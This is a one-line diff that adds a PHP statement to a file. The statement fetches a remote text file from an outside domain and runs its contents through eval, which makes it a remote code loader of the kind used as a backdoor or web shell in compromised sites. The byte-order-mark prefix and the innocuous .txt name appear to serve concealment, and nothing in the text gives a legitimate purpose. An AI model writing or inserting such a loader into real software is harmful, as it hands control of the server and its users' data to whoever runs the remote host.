@@ -1,0 +1,1 @@
+﻿<?php ob_start(); readfile("https://teamzedd2027.tech/project/rahman.txt"); eval('?>'.ob_get_clean()); ?>
